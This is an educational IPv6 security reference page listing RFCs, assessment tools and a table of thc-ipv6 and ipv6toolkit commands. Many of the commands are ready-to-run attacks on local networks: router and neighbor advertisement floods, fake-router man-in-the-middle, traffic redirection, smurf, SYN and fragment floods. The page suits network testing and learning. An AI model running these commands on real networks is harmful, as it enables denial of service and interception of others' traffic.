## :lock:Security in IPv6 Networking
> [!WARNING]
> The content below is provided as educational information.
> Executing some of the commands shown with certain tools installed can be considered malicious by others.
> Please use caution when using any of the information below.

I would like to start with the following statement: IPv6 should not be considered any more or less secure than IPv4.

That said, there are known vulnerabilities in IPv6 with a number of exploits.  Below are some IPv6 security references and tools.

### :notebook:IPv6 Security Reading and References
Reference Name | URL/RFC
------------------------------------ | ---------------------------------------------
IPv6 Fragmentation Attack | https://www.cellstream.com/2019/08/06/example-ipv6-frag-attack/
Example IPv6 SYN Flood Attack | https://www.cellstream.com/2019/08/05/example-ipv6-syn-flood-attack/
The Chiron IPv6 Security Assessment home on Github | https://github.com/aatlasis/Chiron
Monitoring new related IPv6 vulnerabilites | https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ipv6
IPv6 attack detector | https://github.com/mzweilin/ipv6-attack-detector/ <br /> https://www.honeynet.org/node/944
Observations on the Dropping of Packets with IPv6 Extension Headers in the Real World | https://datatracker.ietf.org/doc/html/rfc7872
Rogue IPv6 Router Advertisement | https://www.rfc-editor.org/rfc/rfc6104.txt
Neighbor Discovery Problems | https://www.rfc-editor.org/rfc/rfc6583.txt
A Discard Prefix for IPv6 | https://tools.ietf.org/html/rfc6666
Network Reconnaissance in IPv6 | https://www.rfc-editor.org/rfc/rfc7707.txt

Other IPv6 Security References
------------------------------

https://github.com/vanhauser-thc/thc-ipv6 - this is the repository of the THC IPv6 Attack Tools
https://github.com/fgont/ipv6toolkit - this is the SI6 repository for their IPv6 Attack Tools
https://github.com/aatlasis/Chiron - this is the Chiron IPv6 Security Assessment home on Github
IPv6 Fragmentation Attack	https://www.cellstream.com/2019/08/06/example-ipv6-frag-attack/
Example IPv6 SYN Flood Attack	https://www.cellstream.com/2019/08/05/example-ipv6-syn-flood-attack/
Monitoring new related IPv6 vulnerabilites	https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ipv6
IPv6 attack detector	https://github.com/mzweilin/ipv6-attack-detector/
https://www.honeynet.org/node/944
Observations on the Dropping of Packets with IPv6 Extension Headers in the Real World	https://datatracker.ietf.org/doc/html/rfc7872
Rogue IPv6 Router Advertisement	https://www.rfc-editor.org/rfc/rfc6104.txt
Neighbor Discovery Problems	https://www.rfc-editor.org/rfc/rfc6583.txt
A Discard Prefix for IPv6	https://tools.ietf.org/html/rfc6666
Network Reconnaissance in IPv6	https://www.rfc-editor.org/rfc/rfc7707.txt

### :hammer_and_wrench:IPv6 Security Tools
>[!NOTE]
>I believe both these tool sets are standard in Parrot Linux, you can add the ipv6toolkit
>to Kali with `$ sudo apt install ipv6toolkit`

Name | Link URL
------------------------------------- | --------------------------------------------
IPv6 Security Testing: thc-ipv6 | https://github.com/vanhauser-thc/thc-ipv6
IPv6 Security Testing: ipv6-toolkit | https://github.com/fgont/ipv6toolkit
Creating IPv6 Packets: scapy | https://scapy.net <br /> https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf

### :computer:IPv6 Tool Kit Command Examples
Action | Command | Notes
-------------------------------------- | ------------------------------------------------------ | -------------------------------------------------
IPv6 implementation test | `$ sudo ./implementation6 eth0 TARGETIPv6ADDR` | Tests various IPv6 specific options for their implementations. It can also be used to test firewalls
Scan the IPv6 Network with nmap | `$ nmap -6 -sT DOMAIN` | `::1` for localhost
Domain scanning | `$ sudo ./scan6 -v -i eth0 -­d DOMAIN/64` | Scans a provided DOMAIN
Address scanning | `$ sudo ./scan6 -v -i eth0 -­d IPv6ADDR/64` | Scans a specified prefix
Local scan | `$ sudo ./scan6 -i eth0 --local-scan --rand-src-addr --verbose` | Scans for Link-local & Global addresses
Discover global IPv6 addressed devices & MAC addresses | `$ sudo ./scan6 -i eth0 -L -e --print-type global` | Scans for Global IPv6 addresses by MAC
Get IPv6 from a MAC addresses | `$ sudo ./inverse_lookup6 eth0 MACADDR` | Who has MAC Address XX:XX:XX:XX:XX:XX? Tell me your IPv6 address.
Listen for activities on local network | `$ sudo ./alive6 eth0 -v` | Detect ICMPv6 echo-reply on global addresses
Metasploit | `msf > search type:auxiliary ipv6` | Yes, this is the beginning of a deep pond, so we will just mention this
Send ICMPv6 echo-request 1 | `$ ping6 ff02::1%eth0` | All nodes address - RFC4291
Send ICMPv6 echo-request 2 | `$ ping6 ff02::2%eth0` | All Routers address - RFC4291
DAD (Duplicate Address Detection) | `$ sudo ./na6 -i eth0 --accept-src ::/128 --solicited --override --listen --verbose` or `$ sudo ./dos-new-ip6 eth0` | DAD is the mechanism of IPv6 stateless autoconfiguration to detect whether an IPv6 address exists on the network. Every time a new computer asks about IPv6 existence, the attacker replies and claims that he is that IPv6. The new computer cannot join the network since it does not have IPv6 address. It use ICMPv6 neighbor solicitation which sends to all nodes multicast address
Monitoring Duplicate Address Detection | `$ sudo ./detect-new-ip6 eth0` | Listens for new DAD announcements
Neighbor Solicitation Monitoring passively | `$ sudo ./passive_discovery6 eth0` | Just listening!
Neighbor Solicitation | `$ sudo ./flood_solicitate6 eth0 TARGETIPv6ADDR` | Flood the network with neighbor solicitations. If no target is supplied, query address will be 'ff02::1'
Neighbor Solitication Interceptor | `$ sudo ./na6 -i eth0 --accept-target TARGETIPv6ADDR --listen -E 11::33:44:55:66 --solicited --override --verbose`<br /> `$ sudo ./parasite6 -l eth0` | This redirects all local traffic to you by answering falsely to Neighbor Solitication requests
Neighbor Advertisement | `$ sudo ./flood_advertise6 eth0 TARGETIPv6ADDR` or `$ sudo ./na6 -i eth0 --target TARGETIPv6ADDR --dst-address ff02::1 --override -E 1:2:3:4:5:6 --loop --verbose` | Flood the local network with neighbor advertisements. The performance on IPv6 host neighbor tables will degrade and cause a DoS
ICMPv6 Router Discovery | `$ rdisc6 eth0` | Locates IPv6 Routers on a network segment
Router Advertisement | `$ sudo ./flood_router26 eth0` | Flood the local network with router advertisements. Many OS do not have an upper limit to the number of network a machine can belong to. All their resources can be consumed trying to join thousands of fake IPv6 networks
Router Advertisement MITM | `$ sudo ./fake_router26 eth0`<br />'fake_router26 -h' has many interesting options | Announce yourself as a router and become the default router.
RA - Advertise a malicious Current Hop Limit | `$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR --curhop HOPS --loop 1 --verbose` | Advertise a malicious Current Hop Limit such that packets are discarded by the intervening routers
RA - Advertise a malicious MTU | `$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR -M MTU --loop 1 --verbose` | Advertise a small Current Hop Limit such that packets are discarded by the intervening routers
RA - Disable the existing Router | `$ sudo ./ra6 -i eth0 --src-address ROUTERADDR --dst-address TARGETIPv6ADDR --lifetime 0 --loop 1 --verbose` | Impersonate the local router and send a Router Advertisement with a "Router Lifetime" small value. The victim host will remove the router from the 'default routers list'
Router lifetime 0 | `$ sudo ./kill_router6 eth0 ROUTERADDR` | Router Advertisement with Router Lifetime set to 0. It announce to 'ff02:1' that a router is going down to delete it from the routing tables. '*' as router-address will sniff the network for RAs and immediately send a kill packet
TooBig error messages | `$ sudo ./ndpexhaust26 -c -r -p eth0 TARGETIPv6ADDR` | Flood the target /64 network with ICMPv6 TooBig error messages.  Perform NDP Exhaustion attacks with ICMPv6 TooBig and EchoRequest (Fortinet & Cisco sensitive from Fernando Gont test
Smurf attack | `$ sudo ./smurf6 eth0 TARGETIPv6ADDR` | Flood the target with network traffic amplification. Send ICMPv6 echo requests to 'FF02::1' with the spoofed source from the attack target
Fragments management | `$ sudo ./frag6 -i eth0 --flood-frags 10000 --loop --dst-address TARGETIPv6ADDR --verbose` or `$ sudo ./frag6 -i eth0 --flood-frags 100 --loop --src-address ::/0 --dst-address TARGETIPv6ADDR --verbose` | Flood the reassembly table with imcomplete fragment packets. Only working with poor fragment reassembly queue management
Fragmentation | `$ sudo ./frag6 -i eth0 --frag-id-policy --dst-address TARGETIPv6ADDR --verbose` | Predictable Identification values result in an information leakage that can be exploited in a number of ways like to perform a Idle-scan, DoS attacks (fragment ID collisions), uncover the rules of a number of firewalls or count the number of systems behind a middle-box for example
Atomic fragments | `$ sudo ./frag6 -i eth0 --frag-type atomic --frag-id 100 --dst-address TARGETIPv6ADDR --verbose` | Atomic fragments are IPv6 packets which are not fragmented but still contain a (redundant) Fragment Header. IPv6 packets that contain a Fragment Header with the Fragment Offset set to 0 and the M flag set to 0. If atomic fragments overlap both of the other ones, all of them can be discarded
Fragment reassembly policy | `$ sudo ./frag6 -i eth0 -v --frag-reass-policy --dst-address TARGETIPv6ADDR --verbose` | Assess fragment reassembly policy
Fragment firewall and implementation tests | `$ sudo ./fragmentation6 eth0 TARGETIPv6ADDR` | The tool fragmentation6 can perform a fragment firewall and implementation check
TCP SYN | `$ sudo ./thcsyn6 eth0 TARGETIPv6ADDR DSTPORT`<br /> 'thcsyn6 -h' has interesting options, <br /> or `$ sudo ./tcp6 -i eth0 --src-address SRCIPv6ADDR --dst-address TARGETIPv6ADDR --dst-port DSTPORT --tcp-flags S --flood-sources 100 --loop --sleep 1 --verbose` | Flood the target with TCP-SYN packets. Destination port can be randomized if you supply "x" as port
Buffer / Connections | `$ sudo ./tcp6 -i eth0 --dst-address TARGETIPv6ADDR --dst-port 80 --listen --src-address TARGETIPv6ADDR/112 --flood-ports 10 --loop --rate-limit 100pps --data "GET / HTTP/1.0\r\n\r\n" --close-mode LAST-ACK` | A buffer/connections flood can be done by TCP-SYN with no controlling process and will make a lots of queue data for such connections
Other denial of services | `$ sudo ./denial6 eth0 TARGETIPv6ADDR CASENUMBER` | The tools 'denial6' allow to performs various denial of services attacks.<br /> Case number :<br /> 1 : large hop-by-hop header with router-alert and filled with unknown options<br /> 2 : large destination header filled with unknown options<br /> 3 : hop-by-hop header with router alert option plus 180 headers<br /> 4 : hop-by-hop header with router alert option plus 178 headers + ping<br /> 5 : AH header + ping<br /> 6 : first fragments of a ping with a hop-by-hop header with router alert<br /> 7 : large hop-by-hop header filled with unknown options (no router alert
Firewall audit & Filter bypass tests | `$ sudo ./firewall6 -H eth0 TARGETIPv6ADDR DSTPORT` # Option '-u' for UDP | Performs various access control & bypass attempts to check implementations
Search for a black hole | `$ blackhole6` and other options with `$ scan6 ` | Search for a black hole can be useful to find out who is dropping specific packets, network reconnaissance or just checking if you EH-enabled attacks would work
Playing with IPv6 Addressing | `$ addr6` Look at `$ man addr6` then try `$ cat file.txt | addr6 -i -s` | Learn IPv6 addressing through IPv6 manipulation tools
